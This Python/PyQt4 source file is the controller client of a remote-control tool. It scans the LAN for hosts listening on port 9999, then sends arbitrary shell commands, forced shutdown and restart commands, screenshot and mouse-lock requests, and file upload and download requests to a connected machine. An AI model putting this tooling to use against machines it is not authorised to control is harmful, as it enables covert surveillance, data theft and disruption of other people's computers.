# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'client.ui'
#
# Created by: PyQt4 UI code generator 4.11.4
#
# WARNING! All changes made in this file will be lost!

from PyQt4 import QtCore, QtGui
import socket
import os, re 
import threading
from threading import Thread, activeCount
import time
import win32ui


def get_local_ip():
    #  这个得到本地ips
    localiplist = socket.gethostbyname_ex(socket.gethostname())[-1]
    for ip in localiplist:
        if ip.split('.')[3] != '1':
            return ip
    return '127.0.0.1'

def execcmd(cmd):
        r = os.popen(cmd)  
        text = r.read()  
        r.close()  
        return text

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8

    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)


class Ui_Dialog(object):
    servercurrentdir = ''

    def setupUi(self, Dialog):
        Dialog.setObjectName(_fromUtf8("Dialog"))
        Dialog.resize(642, 675)
        Dialog.setMinimumSize(QtCore.QSize(484, 675))
        Dialog.setMaximumSize(QtCore.QSize(9999, 99999))
        self.groupBox = QtGui.QGroupBox(Dialog)
        self.groupBox.setGeometry(QtCore.QRect(10, 20, 201, 321))
        self.groupBox.setObjectName(_fromUtf8("groupBox"))
        self.ScanButton = QtGui.QPushButton(self.groupBox)
        self.ScanButton.setGeometry(QtCore.QRect(60, 110, 75, 23))
        self.ScanButton.setObjectName(_fromUtf8("ScanButton"))
        self.label = QtGui.QLabel(self.groupBox)
        self.label.setGeometry(QtCore.QRect(40, 30, 111, 16))
        self.label.setAlignment(QtCore.Qt.AlignCenter)
        self.label.setObjectName(_fromUtf8("label"))
        self.LocalIpEdit = QtGui.QLineEdit(self.groupBox)
        self.LocalIpEdit.setGeometry(QtCore.QRect(20, 70, 161, 21))
        self.LocalIpEdit.setObjectName(_fromUtf8("LocalIpEdit"))
        self.listWidget = QtGui.QListWidget(self.groupBox)
        self.listWidget.setGeometry(QtCore.QRect(10, 180, 181, 121))
        self.listWidget.setObjectName(_fromUtf8("listWidget"))
        self.StatusLabel = QtGui.QLabel(self.groupBox)
        self.StatusLabel.setGeometry(QtCore.QRect(10, 150, 181, 20))
        self.StatusLabel.setAlignment(QtCore.Qt.AlignCenter)
        self.StatusLabel.setObjectName(_fromUtf8("StatusLabel"))
        self.groupBox_2 = QtGui.QGroupBox(Dialog)
        self.groupBox_2.setGeometry(QtCore.QRect(220, 20, 411, 321))
        self.groupBox_2.setObjectName(_fromUtf8("groupBox_2"))
        self.label_2 = QtGui.QLabel(self.groupBox_2)
        self.label_2.setGeometry(QtCore.QRect(10, 30, 81, 21))
        self.label_2.setAlignment(QtCore.Qt.AlignCenter)
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.TargetIpEdit = QtGui.QLineEdit(self.groupBox_2)
        self.TargetIpEdit.setGeometry(QtCore.QRect(90, 30, 101, 21))
        self.TargetIpEdit.setObjectName(_fromUtf8("TargetIpEdit"))
        self.CmdEdit = QtGui.QLineEdit(self.groupBox_2)
        self.CmdEdit.setGeometry(QtCore.QRect(90, 100, 101, 21))
        self.CmdEdit.setObjectName(_fromUtf8("CmdEdit"))
        self.label_3 = QtGui.QLabel(self.groupBox_2)
        self.label_3.setGeometry(QtCore.QRect(10, 100, 81, 21))
        self.label_3.setAlignment(QtCore.Qt.AlignCenter)
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.SendMsgButton = QtGui.QPushButton(self.groupBox_2)
        self.SendMsgButton.setGeometry(QtCore.QRect(200, 100, 41, 21))
        self.SendMsgButton.setObjectName(_fromUtf8("SendMsgButton"))
        self.TargetPortEdit = QtGui.QLineEdit(self.groupBox_2)
        self.TargetPortEdit.setGeometry(QtCore.QRect(200, 30, 41, 21))
        self.TargetPortEdit.setObjectName(_fromUtf8("TargetPortEdit"))
        self.groupBox_3 = QtGui.QGroupBox(self.groupBox_2)
        self.groupBox_3.setEnabled(True)
        self.groupBox_3.setGeometry(QtCore.QRect(10, 150, 391, 51))
        self.groupBox_3.setObjectName(_fromUtf8("groupBox_3"))
        self.UserInfoButton = QtGui.QPushButton(self.groupBox_3)
        self.UserInfoButton.setGeometry(QtCore.QRect(20, 20, 75, 23))
        self.UserInfoButton.setObjectName(_fromUtf8("UserInfoButton"))
        self.UserInfoButton_2 = QtGui.QPushButton(self.groupBox_3)
        self.UserInfoButton_2.setGeometry(QtCore.QRect(210, 20, 75, 23))
        self.UserInfoButton_2.setObjectName(_fromUtf8("UserInfoButton_2"))
        self.CurrentCataButton = QtGui.QPushButton(self.groupBox_3)
        self.CurrentCataButton.setGeometry(QtCore.QRect(110, 20, 75, 23))
        self.CurrentCataButton.setObjectName(_fromUtf8("CurrentCataButton"))
        self.TaskListButton = QtGui.QPushButton(self.groupBox_3)
        self.TaskListButton.setGeometry(QtCore.QRect(300, 20, 75, 23))
        self.TaskListButton.setObjectName(_fromUtf8("TaskListButton"))
        self.groupBox_4 = QtGui.QGroupBox(self.groupBox_2)
        self.groupBox_4.setEnabled(True)
        self.groupBox_4.setGeometry(QtCore.QRect(10, 210, 391, 101))
        self.groupBox_4.setObjectName(_fromUtf8("groupBox_4"))
        self.LocalFileAddressEdit = QtGui.QLineEdit(self.groupBox_4)
        self.LocalFileAddressEdit.setGeometry(QtCore.QRect(10, 21, 151, 20))
        self.LocalFileAddressEdit.setText(_fromUtf8(""))
        self.LocalFileAddressEdit.setObjectName(_fromUtf8("LocalFileAddressEdit"))
        self.FindLocalFileButton = QtGui.QPushButton(self.groupBox_4)
        self.FindLocalFileButton.setGeometry(QtCore.QRect(10, 40, 91, 21))
        self.FindLocalFileButton.setObjectName(_fromUtf8("FindLocalFileButton"))
        self.SendFileButton = QtGui.QPushButton(self.groupBox_4)
        self.SendFileButton.setGeometry(QtCore.QRect(110, 70, 61, 21))
        self.SendFileButton.setObjectName(_fromUtf8("SendFileButton"))
        self.RecFileButton = QtGui.QPushButton(self.groupBox_4)
        self.RecFileButton.setGeometry(QtCore.QRect(200, 70, 61, 21))
        self.RecFileButton.setObjectName(_fromUtf8("RecFileButton"))
        self.LongFileAddressEdit = QtGui.QLineEdit(self.groupBox_4)
        self.LongFileAddressEdit.setGeometry(QtCore.QRect(210, 20, 151, 20))
        self.LongFileAddressEdit.setText(_fromUtf8(""))
        self.LongFileAddressEdit.setObjectName(_fromUtf8("LongFileAddressEdit"))
        self.label_4 = QtGui.QLabel(self.groupBox_4)
        self.label_4.setGeometry(QtCore.QRect(210, 40, 54, 20))
        self.label_4.setObjectName(_fromUtf8("label_4"))
        self.ConnectButton = QtGui.QPushButton(self.groupBox_2)
        self.ConnectButton.setGeometry(QtCore.QRect(90, 60, 101, 21))
        self.ConnectButton.setObjectName(_fromUtf8("ConnectButton"))
        self.groupBox_5 = QtGui.QGroupBox(self.groupBox_2)
        self.groupBox_5.setGeometry(QtCore.QRect(250, 20, 151, 121))
        self.groupBox_5.setObjectName(_fromUtf8("groupBox_5"))
        self.UserInfoButton_3 = QtGui.QPushButton(self.groupBox_5)
        self.UserInfoButton_3.setGeometry(QtCore.QRect(10, 30, 61, 31))
        self.UserInfoButton_3.setObjectName(_fromUtf8("UserInfoButton_3"))
        self.ShutdownButton = QtGui.QPushButton(self.groupBox_5)
        self.ShutdownButton.setGeometry(QtCore.QRect(10, 72, 61, 31))
        self.ShutdownButton.setObjectName(_fromUtf8("ShutdownButton"))
        self.RestartButon = QtGui.QPushButton(self.groupBox_5)
        self.RestartButon.setGeometry(QtCore.QRect(80, 72, 61, 31))
        self.RestartButon.setObjectName(_fromUtf8("RestartButon"))
        self.MouseLockButton = QtGui.QPushButton(self.groupBox_5)
        self.MouseLockButton.setGeometry(QtCore.QRect(80, 30, 61, 31))
        self.MouseLockButton.setObjectName(_fromUtf8("MouseLockButton"))
        self.UserInfoButton_3.raise_()
        self.UserInfoButton_2.raise_()
        self.ShutdownButton.raise_()
        self.RestartButon.raise_()
        self.MouseLockButton.raise_()
        self.textEdit = QtGui.QTextEdit(Dialog)
        self.textEdit.setGeometry(QtCore.QRect(10, 350, 621, 311))
        self.textEdit.setObjectName(_fromUtf8("textEdit"))

        self.retranslateUi(Dialog)
        QtCore.QObject.connect(self.ScanButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.scan_ip)
        QtCore.QObject.connect(self.listWidget, QtCore.SIGNAL(_fromUtf8("doubleClicked(QModelIndex)")), self.listWidget.edit)
        QtCore.QObject.connect(self.SendMsgButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.send_cmd)
        QtCore.QObject.connect(self.ShutdownButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.shutdown)
        QtCore.QObject.connect(self.RestartButon, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.restart)
        QtCore.QObject.connect(self.UserInfoButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.get_pcinfo)
        QtCore.QObject.connect(self.UserInfoButton_2, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.get_portinfo)
        QtCore.QObject.connect(self.UserInfoButton_3, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.get_desktop)
        QtCore.QObject.connect(self.SendFileButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.send_file)
        QtCore.QObject.connect(self.RecFileButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.rec_file)
        QtCore.QObject.connect(self.FindLocalFileButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.browse_local_file)
        QtCore.QObject.connect(self.CurrentCataButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.dir_button)
        QtCore.QObject.connect(self.TaskListButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.tasklist_button)
        QtCore.QObject.connect(self.ConnectButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.connect_button)
        QtCore.QObject.connect(self.MouseLockButton, QtCore.SIGNAL(_fromUtf8("clicked()")), Dialog.mouse_lock)
        QtCore.QMetaObject.connectSlotsByName(Dialog)
        Dialog.setTabOrder(self.SendMsgButton, self.LocalIpEdit)
        Dialog.setTabOrder(self.LocalIpEdit, self.listWidget)
        Dialog.setTabOrder(self.listWidget, self.TargetIpEdit)
        Dialog.setTabOrder(self.TargetIpEdit, self.CmdEdit)
        Dialog.setTabOrder(self.CmdEdit, self.ScanButton)
        Dialog.setTabOrder(self.ScanButton, self.TargetPortEdit)
        Dialog.setTabOrder(self.TargetPortEdit, self.textEdit)

    def retranslateUi(self, Dialog):
        Dialog.setWindowTitle(_translate("Dialog", "Client", None))
        self.groupBox.setTitle(_translate("Dialog", "IP扫描", None))
        self.ScanButton.setText(_translate("Dialog", "开始扫描", None))
        self.label.setText(_translate("Dialog", "本机内网IP", None))
        self.StatusLabel.setText(_translate("Dialog", "未进行扫描", None))
        self.groupBox_2.setTitle(_translate("Dialog", "远程控制", None))
        self.label_2.setText(_translate("Dialog", "目标IP:端口", None))
        self.TargetIpEdit.setText(_translate("Dialog", get_local_ip(), None))
        self.CmdEdit.setText(_translate("Dialog", "calc", None))
        self.label_3.setText(_translate("Dialog", "CMD命令：", None))
        self.SendMsgButton.setText(_translate("Dialog", "发送", None))
        self.TargetPortEdit.setText(_translate("Dialog", "9999", None))
        self.groupBox_3.setTitle(_translate("Dialog", "常用命令", None))
        self.UserInfoButton.setText(_translate("Dialog", "PC信息", None))
        self.UserInfoButton_2.setText(_translate("Dialog", "端口信息", None))
        self.CurrentCataButton.setText(_translate("Dialog", "当前目录", None))
        self.TaskListButton.setText(_translate("Dialog", "进程列表", None))
        self.groupBox_4.setTitle(_translate("Dialog", "传送文件", None))
        self.FindLocalFileButton.setText(_translate("Dialog", "浏览本地目录", None))
        self.SendFileButton.setText(_translate("Dialog", "发送", None))
        self.RecFileButton.setText(_translate("Dialog", "接收", None))
        self.label_4.setText(_translate("Dialog", "远程目录", None))
        self.ConnectButton.setText(_translate("Dialog", "连接", None))
        self.groupBox_5.setTitle(_translate("Dialog", "常用操作", None))
        self.UserInfoButton_3.setText(_translate("Dialog", "桌面截图", None))
        self.ShutdownButton.setText(_translate("Dialog", "关机", None))
        self.RestartButon.setText(_translate("Dialog", "重启", None))
        self.MouseLockButton.setText(_translate("Dialog", "鼠标锁定", None))

        self.LocalIpEdit.setText(get_local_ip())

    def check_port(self, ip, port):
        if activeCount() <= 200:
            os.system('title '+str(port))
            cli_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                indicator = cli_sock.connect_ex((ip, port))
                if indicator == 0:
                    return True
                cli_sock.close()	
            except Exception as e:
                print e

    def connect_button(self):
        target_host = str(self.TargetIpEdit.text())
        target_port = int(self.TargetPortEdit.text())

        result = self.check_port(target_host,target_port)
        if str(result)=='True':
            self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.client.connect((target_host,target_port))
            self.client.send('Request to connect!')
            response = str(self.client.recv(4096))
            QtGui.QMessageBox.information( self, (_translate("Dialog", "成功", None)),(_translate("Dialog", "成功连接！", None)))
            self.servercurrentdir = self.currentdir()

        else:
            QtGui.QMessageBox.information( self, (_translate("Dialog", "错误", None)),(_translate("Dialog", "该端口未开放，连接失败", None)))
            return

    def currentdir(self):
        msg = str('pwd')
        self.client.send(msg)
        response = str(self.client.recv(1024))
        self.textEdit.setText(">>" + response.decode('gbk'))
        return response


    def mouse_lock(self):
        QtGui.QMessageBox.information( self, (_translate("Dialog", "成功", None)),(_translate("Dialog", "鼠标锁定10s", None)))
        msg = str('lock')
        self.client.send(msg)
        # response = str(self.client.recv(4096))


    def dir_button(self):
        msg = str('dir')
        self.client.send(msg)
        response = str(self.client.recv(4096))
        self.textEdit.setText(response.decode('gbk'))


    def calc_button(self):
        msg = str('calc')
        self.client.send(msg)                         
        response = str(self.client.recv(4096))
        self.textEdit.setText(response.decode('gbk'))

    def tasklist_button(self):
        msg = str('tasklist')
        self.client.send(msg)
        response = str(self.client.recv(4096))
        self.textEdit.setText(response.decode('gbk'))

    def get_pcinfo(self):
        msg = str('net config workstation')
        self.client.send(msg)
        response = str(self.client.recv(4096))
        self.textEdit.setText(response.decode('gbk'))
    
    def get_portinfo(self):
        msg = str('netstat -ano')
        self.client.send(msg)                         
        response = str(self.client.recv(4096))
        self.textEdit.setText(response.decode('gbk'))

    def get_desktop(self):
        msg = str('screenshoot')
        self.client.send(msg)
        add='1.jpg'
        response = str(self.client.recv(4096))
        try:
            if response=='ready':
                # QtGui.QMessageBox.information( self, (_translate("Dialog", "截图", None)),(_translate("Dialog", "就绪，正在传输...", None)))
                self.textEdit.setText((_translate("Dialog", "就绪，正在传输...", None)))
                f= open(add, 'wb')
                while True:
                    data = self.client.recv(4096)
                    if data == 'EOF':
                        # QtGui.QMessageBox.information( self, (_translate("Dialog", "截图", None)),(_translate("Dialog", "截图成功，保存在根目录", None)))
                        self.textEdit.setText(_translate("Dialog", "截图成功，保存在根目录", None))
                        break
                    f.write(data)
                f.close()
        except Exception as e:
            raise e
        finally:
            cmd = "cmd.exe 1.jpg"
            r = os.popen(cmd)  


    def send_file(self):
        local_cata=str(self.LocalFileAddressEdit.text())
        if local_cata=='':
            QtGui.QMessageBox.information( self, (_translate("Dialog", "错误", None)),(_translate("Dialog", "请浏览本地文件目录", None)))
            return 
        client_command='put '+os.path.basename(local_cata)
        self.client.send(client_command)
        data = self.client.recv(4096)
        if data == 'ready':
            # QtGui.QMessageBox.information( self, (_translate("Dialog", "文件发送", None)),(_translate("Dialog", "就绪，正在传输", None)))
            self.textEdit.setText(_translate("Dialog", "就绪，正在传输", None))
            try:
                f = open(local_cata, 'rb')
                while True:
                    data = f.read(4096)
                    if not data:
                        break
                    self.client.sendall(data)
                time.sleep(1)
                self.client.sendall('EOF')     
                f.close()           
            except Exception as e:
                print e
                
            # QtGui.QMessageBox.information( self, (_translate("Dialog", "文件传输", None)),(_translate("Dialog", "文件发送成功", None)))
            self.textEdit.setText(_translate("Dialog", "文件发送成功", None))

            
        else:
            QtGui.QMessageBox.information( self, (_translate("Dialog", "文件传输", None)),(_translate("Dialog", "连接出错", None)))

    def rec_file(self):
        long_cata=str(self.LongFileAddressEdit.text())
        if long_cata=='':
            QtGui.QMessageBox.information( self, (_translate("Dialog", "错误", None)),(_translate("Dialog", "请填写远程目录", None)))
        msg = str('get '+long_cata)
        self.client.send(msg)
        add=os.path.basename(long_cata)
        response = str(self.client.recv(4096))
        if response=='ready':
            # QtGui.QMessageBox.information( self, (_translate("Dialog", "文件传输", None)),(_translate("Dialog", "就绪，正在传输...", None)))
            self.textEdit.setText(_translate("Dialog", "就绪，正在传输...", None))
            try:
                f= open(add, 'wb')

                while True:
                    data = self.client.recv(4096)
                    if data == 'EOF':
                        # QtGui.QMessageBox.information( self, (_translate("Dialog", "文件传输", None)),(_translate("Dialog", "接收成功，保存在根目录", None)))
                        self.textEdit.setText(_translate("Dialog", "接收成功，保存在根目录", None))

                        break
                    elif data == 'error':
                        QtGui.QMessageBox.information( self, (_translate("Dialog", "文件传输error", None)),(_translate("Dialog", "接收失败，请检查路径名！", None)))
                        print "get error!"
                        break
                    f.write(data)
            except e:
                raise e
            finally:
                f.close()

    def browse_local_file(self):
        dlg = win32ui.CreateFileDialog(0, None, None, 0, "Html File(*.html)|*.*||")
        dlg.DoModal()
        self.LocalFileAddressEdit.setText (str(dlg.GetPathName()))


    
    def scan_port(self,dst):
        port = 9999
        if activeCount() <= 200:
            os.system('title '+str(port))
            cli_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                indicator = cli_sock.connect_ex((dst, port))
                if indicator == 0:
                    return '(9999)'
                cli_sock.close()
            except:
                pass

    def new_thread_scanip(self):
        #改变标签状态
        self.ScanButton.setEnabled(False)
        self.StatusLabel.setText((_translate("Dialog", "扫描中...", None)))
        QtGui.QMessageBox.information( self, (_translate("Dialog", "扫描", None)),(_translate("Dialog", "可能需要1-2分钟", None)))
         
        #扫描IP
        local_ip_raw=self.LocalIpEdit.text()
        local_ip_seg=str(local_ip_raw).split('.')
        local_ip=local_ip_seg[0]+'.'+local_ip_seg[1]+'.'+local_ip_seg[2]+'.'+'0'
        cmd = str('python ip.py '+local_ip)
        result = execcmd(cmd)

        
        #记录IP
        pat1 = "ip:(.{11,18})is"
        count=0
        self.listWidget.clear()
        for ip_item in re.findall(pat1, result):
            print ip_item
            if ip_item.strip() != str(local_ip_raw).strip():
                count=count+1
                #扫描端口9999是否开放
                port=str(self.scan_port(ip_item.strip()))
                if port=='None':
                    port=''
                self.listWidget.addItem(ip_item.strip()+port)
            else:
                continue

        #改变标签状态
        self.StatusLabel.setText((_translate("Dialog", "扫描完毕", None)))
        QtGui.QMessageBox.information( self, (_translate("Dialog", "完成", None)),(_translate("Dialog", "扫描到 "+str(count)+" 个Ip", None)))
        self.ScanButton.setEnabled(True)



            

    def scan_ip(self):
        scan_ip_handle= threading.Thread(target=self.new_thread_scanip,args=())
        scan_ip_handle.start()


    def send_cmd(self):
        msg = str( self.CmdEdit.text())
        # 发送数据
        self.client.send(msg)                            
        # 接收响应
        response = str(self.client.recv(4096))
        self.textEdit.setText(response.decode('gbk'))
                   

    def shutdown(self):
        msg = str('shutdown -s -t 10 -f ')
        self.client.send(msg)                         
        response = str(self.client.recv(4096))


    def restart(self):
        msg = str('shutdown -r -t 10 -f ')
        self.client.send(msg)                         
        response = str(self.client.recv(4096))
